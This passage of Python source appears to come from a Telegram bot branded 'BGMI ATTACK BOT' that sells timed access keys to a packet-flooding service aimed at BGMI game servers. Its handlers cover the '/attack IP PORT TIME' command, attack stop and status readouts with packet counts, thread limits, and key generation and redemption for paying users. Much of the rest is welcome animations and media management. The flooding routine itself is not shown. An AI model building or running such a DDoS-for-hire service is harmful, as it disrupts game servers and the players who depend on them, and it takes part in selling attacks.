🫧 ᴅᴇᴠᴇʟᴏᴩᴇʀ 🪽 ➪ [𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞]({OWNER_LINK}) ✔︎
"""
        
        emoji_msg = None
        emoji_id = get_random_emoji()
        if emoji_id:
            try:
                emoji_msg = await client.send_sticker(chat_id, emoji_id)
            except:
                pass
        
        await asyncio.sleep(0.3)
        
        welcome_emojis = ["🩷", "🌸", "🏖️", "🍰", "🥂"]
        welcome_msg = await client.send_message(
            chat_id, 
            f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})...🩷"
        )
        
        for emoji in welcome_emojis:
            await asyncio.sleep(0.3)
            try:
                await welcome_msg.edit_text(f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})...{emoji}")
            except:
                pass
        
        if emoji_msg:
            try:
                await emoji_msg.delete()
            except:
                pass
        
        await asyncio.sleep(0.2)
        
        starting_emojis = [
            "🚀", "🌠", "🪶", "🍓", "🤖", "🥡", 
            "🍷", "🍭", "🍨", "🧭", "🫧", "🍫", "🛸"
        ]
        words = ["s", "t", "α", "я", "т", "ι", "и", "g", ".", ".", ".", ".", "."]
        
        await welcome_msg.edit_text(f"**{starting_emojis[0]}**")
        await asyncio.sleep(0.15)
        
        for i in range(len(words)):
            current_text = "".join(words[:i+1])
            emoji = starting_emojis[i % len(starting_emojis)]
            try:
                await welcome_msg.edit_text(f"**{emoji} " + current_text + "**")
            except:
                pass
            await asyncio.sleep(0.12)
        
        await asyncio.sleep(0.2)
        
        try:
            await welcome_msg.delete()
        except:
            pass
        
        await asyncio.sleep(0.2)
        
        sticker_msg = None
        if sticker_id:
            try:
                sticker_msg = await client.send_sticker(chat_id, sticker_id)
            except:
                pass
        
        if sticker_msg:
            await asyncio.sleep(video_delay_time)
        else:
            await asyncio.sleep(video_delay_time)
        
        final_msg = None
        if video_data and os.path.exists(video_data["path"]):
            final_msg = await client.send_video(
                chat_id,
                video_data["path"],
                caption=final_text,
                reply_markup=kb
            )
        else:
            final_msg = await client.send_message(
                chat_id,
                final_text,
                reply_markup=kb
            )
        
        if sticker_msg:
            remaining_time = sticker_display_time - video_delay_time
            if remaining_time > 0:
                await asyncio.sleep(remaining_time)
            
            try:
                await sticker_msg.delete()
            except:
                pass
        
        return final_msg
        
    except Exception as e:
        logger.error(f"Welcome animation error: {e}")

# ═══════════════ START ═══════════════
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    await welcome_animation(client, msg)

# ═══════════════ SET ALL STICKER TIME ═══════════════
@app.on_message(filters.command("setallstickertime") & filters.private)
async def set_all_sticker_time_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⏱️ **{premium_text('SET ALL STICKER TIME', 5)}**\n\n"
            "Use: `/setallstickertime seconds`\n\n"
            f"{premium_text('Example:', 5)} `/setallstickertime 10`\n"
            f"{premium_text('This sets ALL stickers to display for 10 seconds', 1)}\n\n"
            f"📋 {premium_text('Current Settings:', 3)}\n"
            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
        )
    
    try:
        duration = int(parts[1])
        if duration < 1:
            return await msg.reply_text("❌ Duration must be at least 1 second!")
        
        save_settings(sticker_time=duration)
        success, count = set_all_sticker_times(duration)
        
        if success:
            await msg.reply_text(
                f"✅ **{premium_text('ALL STICKERS UPDATED', 5)}** 🎉\n\n"
                f"⏱️ {premium_text('New Duration:', 5)} {duration} {premium_text('seconds', 1)}\n"
                f"📊 {premium_text('Total Stickers Updated:', 5)} {count}\n\n"
                f"🔄 {premium_text('All stickers will now display for', 3)} {duration} {premium_text('seconds!', 1)}\n"
                f"📋 {premium_text('Current Video Delay:', 5)} {get_video_delay_time()}s"
            )
        else:
            await msg.reply_text(
                f"⚠️ **{premium_text('No stickers found!', 5)}**\n\n"
                f"⏱️ {premium_text('Global Sticker Time set to:', 5)} {duration}s\n"
                f"📋 {premium_text('Add stickers using', 1)} `/addsticker`"
            )
            
    except ValueError:
        await msg.reply_text("❌ Invalid input! Use a number.")

# ═══════════════ SET VIDEO DELAY ═══════════════
@app.on_message(filters.command("setvideodelay") & filters.private)
async def set_video_delay_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⏱️ **{premium_text('SET VIDEO DELAY', 5)}**\n\n"
            "Use: `/setvideodelay seconds`\n\n"
            f"{premium_text('Example:', 5)} `/setvideodelay 4`\n"
            f"{premium_text('Video will appear after 4 seconds', 1)}\n\n"
            f"📋 {premium_text('Current Settings:', 3)}\n"
            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
        )
    
    try:
        delay = int(parts[1])
        if delay < 1:
            return await msg.reply_text("❌ Delay must be at least 1 second!")
        
        sticker_time = get_sticker_display_time()
        if delay >= sticker_time:
            await msg.reply_text(
                f"⚠️ **{premium_text('Warning!', 5)}**\n\n"
                f"{premium_text('Video Delay', 3)} ({delay}s) {premium_text('should be less than Sticker Time', 1)} ({sticker_time}s)\n\n"
                f"💡 {premium_text('Recommended:', 5)} {premium_text('Video Delay < Sticker Time', 2)}\n"
                f"{premium_text('Example:', 5)} {premium_text('Sticker 6s, Video 4s', 4)}"
            )
            return
        
        save_settings(video_delay=delay)
        
        await msg.reply_text(
            f"✅ **{premium_text('VIDEO DELAY UPDATED', 5)}** 🎉\n\n"
            f"⏱️ {premium_text('New Video Delay:', 5)} {delay} {premium_text('seconds', 1)}\n"
            f"📋 {premium_text('Current Settings:', 3)}\n"
            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s\n\n"
            f"🔄 {premium_text('Video will now appear after', 3)} {delay} {premium_text('seconds!', 1)}"
        )
            
    except ValueError:
        await msg.reply_text("❌ Invalid input! Use a number.")

# ═══════════════ SET SINGLE STICKER TIME ═══════════════
@app.on_message(filters.command("setstickertime") & filters.private)
async def set_sticker_time_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 3:
        return await msg.reply_text(
            f"⏱️ **{premium_text('SET STICKER TIME', 5)}**\n\n"
            "Use: `/setstickertime index seconds`\n\n"
            f"{premium_text('Example:', 5)} `/setstickertime 1 10`\n"
            f"{premium_text('This sets sticker #1 to display for 10 seconds', 1)}\n\n"
            f"{premium_text('Get index from', 3)} `/liststickers` {premium_text('command.', 1)}\n\n"
            f"📋 {premium_text('Current Settings:', 3)}\n"
            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
        )
    
    try:
        index = int(parts[1]) - 1
        duration = int(parts[2])
        
        if duration < 1:
            return await msg.reply_text("❌ Duration must be at least 1 second!")
        
        stickers = get_all_stickers()
        if index < 0 or index >= len(stickers):
            return await msg.reply_text(f"❌ {premium_text('Invalid index!', 5)} {premium_text('Total stickers:', 1)} {len(stickers)}")
        
        sticker_id = stickers[index]
        save_sticker_time(sticker_id, duration)
        
        await msg.reply_text(
            f"✅ **{premium_text('STICKER TIME UPDATED', 5)}**\n\n"
            f"🆔 {premium_text('Sticker', 3)} #{index+1}\n"
            f"⏱️ {premium_text('New Duration:', 5)} {duration} {premium_text('seconds', 1)}\n\n"
            f"📋 {premium_text('Current Settings:', 3)}\n"
            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
        )
    except ValueError:
        await msg.reply_text("❌ Invalid input! Use numbers only.")

# ═══════════════ SHOW SETTINGS ═══════════════
@app.on_message(filters.command("settings") & filters.private)
async def settings_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    sticker_time = get_sticker_display_time()
    video_delay = get_video_delay_time()
    
    await msg.reply_text(
        f"⚙️ **{premium_text('CURRENT SETTINGS', 5)}**\n\n"
        f"{LINE}\n"
        f"⏱️ {premium_text('Sticker Display Time:', 3)} {sticker_time}s\n"
        f"⏱️ {premium_text('Video Delay:', 3)} {video_delay}s\n"
        f"{LINE}\n\n"
        f"📝 **{premium_text('Commands:', 5)}**\n"
        f"• `/setallstickertime seconds` - {premium_text('Set ALL stickers', 1)}\n"
        f"• `/setstickertime index seconds` - {premium_text('Set single sticker', 2)}\n"
        f"• `/setvideodelay seconds` - {premium_text('Set video delay', 3)}\n"
        f"• `/settings` - {premium_text('Show this menu', 4)}\n\n"
        f"💡 **{premium_text('Note:', 5)}** {premium_text('Video Delay should be less than Sticker Time', 1)}"
    )

# ═══════════════ COMMANDS CALLBACK ═══════════════
@app.on_callback_query(filters.regex("commands_menu"))
async def commands_menu_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    commands_text = get_commands_list(is_owner)
    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
    await cb.message.edit_text(formatted_text, reply_markup=menu_back_kb())

# ═══════════════ CALLBACKS ═══════════════
@app.on_callback_query()
async def callbacks(client, cb: CallbackQuery):
    data = cb.data
    uid = cb.from_user.id
    
    if data == "sep":
        await cb.answer()
        return
    
    if data == "menu":
        await cb.answer("⌂ Going to menu...")
        user = cb.from_user
        uid = user.id
        info = get_user_info(uid)
        
        if uid == OWNER_ID:
            kb = owner_kb()
        else:
            kb = user_kb()
        
        expiry_text = ""
        if info.get("remaining"): expiry_text += f"\n⏳ Remaining: {info['remaining']}"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                expiry_text += f"\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}"
            except: pass
        
        text = (
            f"💀 BGMI ATTACK BOT 💀\n\n"
            f"{LINE}\n"
            f"👤 {user.first_name}\n"
            f"🆔 {uid}\n"
            f"💳 {info['type']}{expiry_text}\n"
            f"{LINE}\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max Time\n"
            f"📹 {len(get_vids())} Videos\n"
            f"{LINE}\n"
            "⚔️ /attack IP PORT TIME\n"
            "📋 /attack 1.2.3.4 8080 600\n"
            "🎮 BGMI Ports: 7000-15000\n"
            f"{LINE}\n"
            "🔽 SELECT OPTION:"
        )
        await cb.message.edit_text(text, reply_markup=kb)
        return
    
    if data == "redeem_popup":
        await cb.answer(
            "🪪 About Redeem ♡\n\n"
            "🔑 How To Redeem Key?\n\n"
            "1️⃣ Get Key From Admin\n"
            f"📲 @{OWNER_USERNAME}\n\n"
            "2️⃣ Use Command:\n"
            "/redeem YOUR_KEY\n\n"
            "3️⃣ Example:\n"
            "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
            "⏱️ Durations:\n"
            "30m • 1h • 24h • 7d • 2w • 1mo\n\n"
            "💎 Premium = Power!",
            show_alert=True
        )
        return
    
    if data == "commands_menu":
        is_owner = (uid == OWNER_ID)
        commands_text = get_commands_list(is_owner)
        formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
        await cb.message.edit_text(formatted_text, reply_markup=menu_back_kb())
        return
    
    if data == "back":
        user = cb.from_user
        uid = user.id
        info = get_user_info(uid)
        
        if uid == OWNER_ID:
            kb = owner_kb()
        else:
            kb = user_kb()
        
        expiry_text = ""
        if info.get("remaining"): expiry_text += f"\n⏳ Remaining: {info['remaining']}"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                expiry_text += f"\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}"
            except: pass
        
        text = (
            f"💀 BGMI ATTACK BOT 💀\n\n"
            f"{LINE}\n"
            f"👤 {user.first_name}\n"
            f"🆔 {uid}\n"
            f"💳 {info['type']}{expiry_text}\n"
            f"{LINE}\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max Time\n"
            f"📹 {len(get_vids())} Videos\n"
            f"{LINE}\n"
            "⚔️ /attack IP PORT TIME\n"
            "📋 /attack 1.2.3.4 8080 600\n"
            "🎮 BGMI Ports: 7000-15000\n"
            f"{LINE}\n"
            "🔽 SELECT OPTION:"
        )
        await cb.message.edit_text(text, reply_markup=kb)
        return
    
    await cb.answer()
    
    if data == "back_admin":
        if uid != OWNER_ID: return
        await cb.message.edit_text("⚜ **ADMIN PANEL**\n\n🔽 Select:", reply_markup=admin_kb())
        return
    
    if data == "emoji_menu":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        await cb.message.edit_text(
            f"★ **EMOJI MANAGER**\n\n"
            f"🔹 Total Emojis: {len(emojis)}\n"
            f"🔹 Commands:\n"
            f"• `/addemoji` - Reply to premium emoji\n"
            f"• `/removeemoji index` - Remove by index\n"
            f"• `/listemojis` - List all emojis\n"
            f"• `/resetemojis` - Reset all\n\n"
            f"✨ Emojis appear randomly in welcome animation!",
            reply_markup=emoji_kb()
        )
        return
    
    if data == "e_add":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ **ADD EMOJI**\n\n"
            "Reply to a premium emoji with:\n"
            "`/addemoji`\n\n"
            "✨ The emoji will be added to welcome animation!",
            reply_markup=emoji_kb()
        )
        return
    
    if data == "e_remove":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ **REMOVE EMOJI**\n\n"
            "Use: `/removeemoji index`\n\n"
            "Get index from `/listemojis` command.",
            reply_markup=emoji_kb()
        )
        return
    
    if data == "e_list":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis added yet!", show_alert=True)
            return
        text = f"⌘ **EMOJI LIST**\n\n"
        for i, emoji_id in enumerate(emojis, 1):
            text += f"**{i}.** `{emoji_id[:30]}...`\n"
        text += f"\n🔹 Total: {len(emojis)}"
        await cb.message.edit_text(text, reply_markup=emoji_kb())
        return
    
    if data == "e_reset":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_emojis()
        await cb.answer("🔄 All emojis reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ **EMOJIS RESET**\n\n"
            f"🔹 Total Emojis: 0\n\n"
            "All emojis removed from the list.",
            reply_markup=emoji_kb()
        )
        return
    
    if data == "sticker_menu":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        sticker_times = get_sticker_times()
        text = f"❄ **STICKER MANAGER**\n\n"
        text += f"🔹 Total Stickers: {len(stickers)}\n"
        if stickers:
            text += "🔹 Sticker Times:\n"
            for i, sid in enumerate(stickers[:5], 1):
                time = sticker_times.get(sid, get_sticker_display_time())
                text += f"   #{i}: {time}s\n"
        text += f"\n🔹 Commands:\n"
        text += f"• `/addsticker` - Reply to sticker (Auto-detect)\n"
        text += f"• `/removesticker index` - Remove by index\n"
        text += f"• `/liststickers` - List all stickers\n"
        text += f"• `/resetstickers` - Reset all\n"
        text += f"• `/setstickertime index seconds` - Set single sticker\n"
        text += f"• `/setallstickertime seconds` - Set ALL stickers\n\n"
        text += f"⏱️ Default Time: {get_sticker_display_time()}s\n"
        text += f"⏱️ Video Delay: {get_video_delay_time()}s\n"
        text += f"✨ Stickers appear randomly in welcome animation!"
        await cb.message.edit_text(text, reply_markup=sticker_kb())
        return
    
    if data == "s_add":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ **ADD STICKER**\n\n"
            "Reply to a sticker with:\n"
            "`/addsticker`\n\n"
            "⏱️ Auto-Detect: Duration will be detected automatically!\n"
            "✨ The sticker will be added to welcome animation!",
            reply_markup=sticker_kb()
        )
        return
    
    if data == "s_remove":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ **REMOVE STICKER**\n\n"
            "Use: `/removesticker index`\n\n"
            "Get index from `/liststickers` command.",
            reply_markup=sticker_kb()
        )
        return
    
    if data == "s_list":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers added yet!", show_alert=True)
            return
        sticker_times = get_sticker_times()
        text = f"⌘ **STICKER LIST**\n\n"
        for i, sticker_id in enumerate(stickers, 1):
            time = sticker_times.get(sticker_id, get_sticker_display_time())
            text += f"**{i}.** `{sticker_id[:25]}...` ⏱️ {time}s\n"
        text += f"\n🔹 Total: {len(stickers)}"
        text += f"\n\n📋 Settings: Sticker Time: {get_sticker_display_time()}s | Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=sticker_kb())
        return
    
    if data == "s_reset":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_stickers()
        await cb.answer("🔄 All stickers reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ **STICKERS RESET**\n\n"
            f"🔹 Total Stickers: 0\n\n"
            "All stickers removed from the list.",
            reply_markup=sticker_kb()
        )
        return
    
    if data == "video_menu":
        if uid != OWNER_ID: await cb.answer("Owner only!"); return
        vids = get_vids()
        await cb.message.edit_text(
            f"▶ **VIDEO MANAGER**\n\n"
            f"🔹 Total Videos: {len(vids)}\n"
            f"🔹 Commands:\n"
            f"• `/addvideo` - Reply to video\n"
            f"• `/delvideo ID` - Delete by ID\n"
            f"• `/videos` - List all videos\n"
            f"• `/clearvideos` - Clear all\n"
            f"• `/setvideodelay seconds` - Set video delay\n\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s\n"
            f"✨ Videos appear randomly in welcome animation!",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_add":
        if uid != OWNER_ID: await cb.answer("Owner only!", show_alert=True); return
        await cb.message.edit_text(
            f"⎘ **ADD VIDEO**\n\n"
            "Reply to a video with:\n"
            "`/addvideo`\n\n"
            "✨ The video will be added to welcome animation!",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_del":
        if uid != OWNER_ID: await cb.answer("Owner only!", show_alert=True); return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos to delete!", show_alert=True)
            return        await cb.message.edit_text(
            f"⌫ **DELETE VIDEO**\n\n"
            "Use: `/delvideo ID`\n\n"
            "Get ID from `/videos` command.",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_list":
        if uid != OWNER_ID: await cb.answer("Owner only!", show_alert=True); return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos added yet!", show_alert=True)
            return
        text = f"⌘ **VIDEO LIST**\n\n"
        for v in vids[:15]:
            text += f"#{v['id']} {v['name'][:30]}\n"
        text += f"\n🔹 Total: {len(vids)}"
        text += f"\n⏱️ Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=video_kb())
        return
    
    if data == "v_clear":
        if uid != OWNER_ID: await cb.answer("Owner only!", show_alert=True); return
        n = clear_vids()
        await cb.answer(f"🗑️ {n} videos cleared!", show_alert=True)
        await cb.message.edit_text(
            f"⎚ **VIDEOS CLEARED**\n\n"
            f"🔹 Total Videos: 0",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_help":
        await cb.message.edit_text(
            f"❓ **VIDEO HELP**\n\n"
            f"{LINE}\n"
            "📤 Add: Reply + /addvideo\n"
            "📋 List: /videos\n"
            "🗑️ Delete: /delvideo ID\n"
            "🧹 Clear: /clearvideos\n"
            "⏱️ Set Delay: /setvideodelay seconds\n"
            f"{LINE}",
            reply_markup=video_kb()
        )
        return
    
    if data == "stop_attack":
        global attacking
        if attacking and (uid == attack_user or uid == OWNER_ID):
            attacker.on = False; attacking = False
            vid = rand_vid()
            text = f"⛔ **ATTACK STOPPED**\n\n📦 {attacker.pkts:,} packets\n\n🔄 /attack IP PORT TIME"
            await send_vid(cb.message.chat.id, text, None, vid)
            try: await cb.message.delete()
            except: pass
        else:
            await cb.answer("💤 No attack running!", show_alert=True)
        return
    
    if data == "status_btn":
        if attacking:
            e = time.time() - ainfo['start']
            await cb.answer(f"🟢 ATTACKING\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts", show_alert=True)
        else:
            await cb.answer("💤 IDLE", show_alert=True)
        return
    
    if data == "attack_menu":
        uid = cb.from_user.id
        
        checking_msg = await cb.message.reply_text(
            "🔍 **SYSTEM SCAN INITIATED...**\n\n"
            "▫️ 🔐 Verifying user credentials...\n"
            "▫️ 📡 Connecting to secure server...\n"
            "▫️ 🔑 Checking subscription status..."
        )
        
        await asyncio.sleep(0.5)
        
        access, a_type = check_access(uid)
        
        if not access:
            await checking_msg.edit_text(
                "🚫 **ACCESS DENIED**\n\n"
                "╔══════════════════════════╗\n"
                "║  ❌ INVALID CREDENTIALS  ║\n"
                "║  🔒 No Active Plan       ║\n"
                "║  🚫 Access Blocked       ║\n"
                "╚══════════════════════════╝\n\n"
                "🔑 You don't have any active plan!\n\n"
                "To get access:\n"
                "• Buy a key from the owner\n"
                "• Redeem your key using /redeem\n"
                "• Get premium access\n\n"
                f"👑 Contact: FATHER OF BOT"
            )
            return
        
        await checking_msg.delete()
        
        info = get_user_info(uid)
        await cb.message.edit_text(
            f"💀 **ATTACK MENU**\n\n{LINE}\n"
            f"⚔️ /attack IP PORT TIME\n"
            f"📋 /attack 1.2.3.4 8080 600\n"
            f"{LINE}\n"
            f"🎮 BGMI: 7000-15000\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max (10 Minutes)\n"
            f"💳 {a_type}",
            reply_markup=menu_back_kb()
        )
        return
    
    if data == "info_menu":
        info = get_user_info(uid)
        history = get_user_history(uid)
        text = f"ⓘ **USER INFO**\n\n{LINE}\n👤 {cb.from_user.first_name}\n🆔 {uid}\n💳 {info['type']}\n"
        if info.get("remaining"): text += f"⏳ Remaining: {info['remaining']}\n"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                text += f"📅 Expires: {exp.strftime('%d %b, %I:%M %p')}\n"
            except: pass
        text += f"\n{LINE}\n▓ **ATTACK HISTORY:**\n"
        if history:
            for h in history[-5:]:
                try:
                    t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                    text += f"• {t} - {h['action']}\n  {h['details'][:40]}\n"
                except: pass
        else:
            text += "• No attacks yet!\n"
        text += f"\n{LINE}\n📹 Videos: {len(get_vids())}"
        await cb.message.edit_text(text, reply_markup=menu_back_kb())
        return
    
    if data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(f"✅ **ACCESS ACTIVE**\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /attack to start!", reply_markup=menu_back_kb())
        else:
            await cb.message.edit_text(
                f"⚿ **REDEEM KEY**\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 FATHER OF BOT\n\n⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🪪 About Redeem ♡", callback_data="redeem_popup")],
                    [InlineKeyboardButton("📲 Contact-Father", url=OWNER_LINK)],
                    [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
                     InlineKeyboardButton("◀ BACK", callback_data="back")]
                ])
            )
        return
    
    if data == "admin_menu":
        if uid != OWNER_ID: await cb.answer("Owner only!"); return
        await cb.message.edit_text("⚜ **ADMIN PANEL**\n\n🔽 Select:", reply_markup=admin_kb())
        return
    
    if data == "admin_addkey":
        await cb.answer("⚿ ADD KEY\n\nUse: /genkey NAME TIME\n\nExamples:\n/genkey Test 30m\n/genkey VIP 24h\n/genkey Premium 7d\n\nUnits: m=min, h=hour, d=day, w=week, mo=month", show_alert=True)
        return
    
    if data == "admin_auto":
        if uid != OWNER_ID: return
        await cb.message.edit_text("⚜ **AUTO GEN KEY**\n\nLINE\n🔽 Select Duration:", reply_markup=auto_key_kb())
        return
    
    auto_keys = {
        "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
        "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
        "ak_15d": ("15day", "15d"), "ak_23d": ("23day", "23d"), "ak_30d": ("30day", "30d"),
        "ak_1mo": ("1month", "1mo"), "ak_2mo": ("2month", "2mo"), "ak_3mo": ("3month", "3mo"),
    }
    
    if data in auto_keys:
        if uid != OWNER_ID: return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        if key_code:
            await cb.message.edit_text(f"⚿ **KEY GENERATED**\n\nLINE\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\nLINE\n\n📋 User: /redeem {key_code}", reply_markup=auto_key_kb())
        else:
            await cb.answer("❌ Failed!", show_alert=True)
        return
    
    if data == "admin_keys":
        if uid != OWNER_ID: return
        keys = get_keys(); active = [k for k, v in keys.items() if v["active"]]; used = [k for k, v in keys.items() if not v["active"]]
        await cb.message.edit_text(f"⌘ **ALL KEYS**\n\nLINE\n🟢 Active: {len(active)}\n🔴 Used: {len(used)}\nLINE", reply_markup=admin_kb())
        return
    
    if data == "admin_stats":
        if uid != OWNER_ID: return
        vids = get_vids(); users = get_users()
        await cb.message.edit_text(
            f"⎙ **STATS**\n\nLINE\n"
            f"📹 Videos: {len(vids)}\n"
            f"💎 Premium: {len(users.get('premium', []))}\n"
            f"🔑 Key Users: {len(users.get('keys', {}))}\n"
            f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
            f"LINE\n"
            f"⚙️ Settings:\n"
            f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s",
            reply_markup=admin_kb()
        )
        return
    
    if data == "admin_clear":
        if uid != OWNER_ID: return
        removed = remove_expired()
        await cb.answer(f"↺ {removed} expired removed!", show_alert=True)
        return

async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ ATTACK ═══════════════
@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg, attack_user
    uid = msg.from_user.id
    
    checking_msg = await msg.reply_text(
        "🔍 **INITIATING SECURITY PROTOCOL...**\n\n"
        "▫️ Connecting to secure server...\n"
        "▫️ Validating credentials...\n"
        "▫️ Checking subscription status..."
    )
    
    await asyncio.sleep(0.5)
    
    if is_blocked(uid):
        await checking_msg.edit_text(
            "🚫 **ACCESS DENIED**\n\n"
            "╔═══════════════════════╗\n"
            "║  ❌ USER BLOCKED      ║\n"
            "║  🔒 Security Violation ║\n"
            "╚═══════════════════════╝\n\n"
            "Your access has been revoked.\n"
            "Contact owner for appeal."
        )
        return
    
    await checking_msg.edit_text(
        "🔍 **SCANNING USER DATABASE...**\n\n"
        f"▫️ User ID: `{uid}`\n"
        "▫️ Status: Analyzing...\n"
        "▫️ Security Level: ⚡⚡⚡\n"
        "▫️ 🔐 Authentication in progress..."
    )
    
    await asyncio.sleep(0.5)
    
    if uid == OWNER_ID:
        await checking_msg.edit_text(
            "⚜ **MASTER ACCESS GRANTED**\n\n"
            "╔══════════════════════════╗\n"
            "║  ✅ OWNER VERIFIED       ║\n"
            "║  🛡️ Unlimited Access     ║\n"
            "║  🚀 Super Admin Rights   ║\n"
            "╚══════════════════════════╝\n\n"
            "Welcome back, Master! 🫡\n"
            "Initiating attack sequence..."
        )
        await asyncio.sleep(0.5)
        await checking_msg.delete()
        await execute_attack(client, msg, uid)
        return
    
    u = get_users()
    if str(uid) in u.get("premium", []):
        await checking_msg.edit_text(
            "💎 **PREMIUM ACCESS GRANTED**\n\n"
            "╔══════════════════════════╗\n"
            "║  ✅ SUBSCRIPTION ACTIVE  ║\n"
            "║  💎 Premium User        ║\n"
            "║  🚀 Full Power Access   ║\n"
            "╚══════════════════════════╝\n\n"
            "Access granted! Launching attack... 🚀"
        )
        await asyncio.sleep(0.5)
        await checking_msg.delete()
        await execute_attack(client, msg, uid)
        return
    
    await checking_msg.edit_text(
        "🔍 **CHECKING KEY DATABASE...**\n\n"
        "▫️ Searching for active keys...\n"
        "▫️ 🔑 Key validation in progress...\n"
        "▫️ Decrypting access tokens..."
    )
    
    await asyncio.sleep(0.5)
    
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                remaining, _ = get_remaining(uk["expiry"])
                await checking_msg.edit_text(
                    "⚿ **KEY ACCESS GRANTED**\n\n"
                    "╔══════════════════════════╗\n"
                    "║  ✅ KEY VERIFIED         ║\n"
